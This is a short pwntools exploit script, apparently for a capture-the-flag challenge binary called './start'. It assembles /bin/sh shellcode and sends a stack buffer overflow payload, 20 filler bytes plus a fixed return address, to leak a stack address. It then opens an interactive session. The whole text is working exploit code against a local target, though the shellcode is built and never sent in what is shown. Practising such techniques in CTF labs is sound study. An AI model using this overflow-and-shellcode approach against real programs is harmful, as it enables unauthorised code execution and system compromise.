from pwn import *
context.update(arch='i386', os='linux')
context.terminal = ["tmux", "splitw", "-h", "-p", "75"]
p = process("./start")
gdb.attach(p)
p.recvuntil("the CTF:")
print(shellcraft.sh())
shell_code = asm(shellcraft.sh())
print(len(shell_code))
payload = b'A'*0x14+p32(0x08048087)
p.send(payload)
addr = u32(p.recv(4))
print(hex(addr))
p.interactive()